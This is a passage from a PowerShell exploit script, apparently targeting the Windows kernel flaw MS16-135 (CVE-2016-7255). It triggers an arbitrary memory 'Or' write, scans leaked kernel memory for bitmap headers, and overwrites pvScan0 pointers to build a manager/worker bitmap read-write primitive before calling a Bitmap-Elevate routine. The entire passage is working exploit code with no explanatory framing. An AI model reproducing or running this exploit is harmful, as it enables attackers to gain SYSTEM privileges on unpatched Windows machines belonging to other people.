			} $SafeGuard.Stop()
		}
		[IntPtr]$Global:BytePointer = [ms16135]::VirtualAlloc([System.IntPtr]::Zero, 0x2000, 0x3000, 0x40)
		do {
			Write-Verbose "[+] Trying to trigger arbitrary 'Or'.."
			$ByteRead = [ms16135]::GetBitmapBits($WorkerBitmap.BitmapHandle,0x2000,$BytePointer)
			Trigger-Write
			$LoopCount += 1
		} while ($ByteRead -ne 0x2000 -And $LoopCount -lt 10)

		$CallResult = [ms16135]::DestroyWindow($hWndChild)
		$CallResult = [ms16135]::DestroyWindow($hWndParent)
		$CallResult = [ms16135]::UnregisterClass("cve-2016-7255",[IntPtr]::Zero)
		
		if ($LoopCount -eq 10) {
			"`n[!] Bug did not trigger, try again or patched?`n"
			$Script:BugNotTriggered = 1
		}
	}

	Do-OrAddress -Address $TargetAddress
	if ($BugNotTriggered) {
		Return
	}

	if ($OSMajorMinor -eq "6.1") {
		$SizeVal = 0x400000770
	} else {
		$SizeVal = 0x400000760
	}
	do {
		$Read64 = [System.Runtime.InteropServices.Marshal]::ReadInt64($BytePointer.ToInt64() + $LoopCount)
		if ($Read64 -eq $SizeVal) {
			$Pointer1 = [System.Runtime.InteropServices.Marshal]::ReadInt64($BytePointer.ToInt64() + $LoopCount + 16)
			$Pointer2 = [System.Runtime.InteropServices.Marshal]::ReadInt64($BytePointer.ToInt64() + $LoopCount + 24)
			if ($Pointer1 -eq $Pointer2) {
				$BufferOffset = $LoopCount + 16
				Break
			}
		}
		$LoopCount += 8
	} while ($LoopCount -lt 0x2000)
	$pvBits = [System.Runtime.InteropServices.Marshal]::ReadInt64($BytePointer.ToInt64() + $BufferOffset)
	$pvScan0 = [System.Runtime.InteropServices.Marshal]::ReadInt64($BytePointer.ToInt64() + $BufferOffset + 8)

	if ($pvScan0 -ne 0) {
		Write-Verbose "`n[?] Success, reading beyond worker bitmap size!"
		Write-Verbose "[+] Old manager bitmap pvScan0: $('{0:X}' -f $pvScan0)"
	} else {
		"`n[!] Buffer contains invalid data, quitting..`n"
		Return
	}

	[System.Runtime.InteropServices.Marshal]::WriteInt64($($BytePointer.ToInt64() + $BufferOffset),$WorkerBitmap.BitmappvScan0)
	[System.Runtime.InteropServices.Marshal]::WriteInt64($($BytePointer.ToInt64() + $BufferOffset + 8),$WorkerBitmap.BitmappvScan0)
	$pvScan0 = [System.Runtime.InteropServices.Marshal]::ReadInt64($BytePointer.ToInt64() + $BufferOffset + 8)
	Write-Verbose "[+] New manager bitmap pvScan0: $('{0:X}' -f $pvScan0)"

	$CallResult = [ms16135]::SetBitmapBits($WorkerBitmap.BitmapHandle,0x2000,$BytePointer)

	Bitmap-Elevate -ManagerBitmap $ManagerBitmap.BitmapHandle -WorkerBitmap $WorkerBitmap.BitmapHandle
}
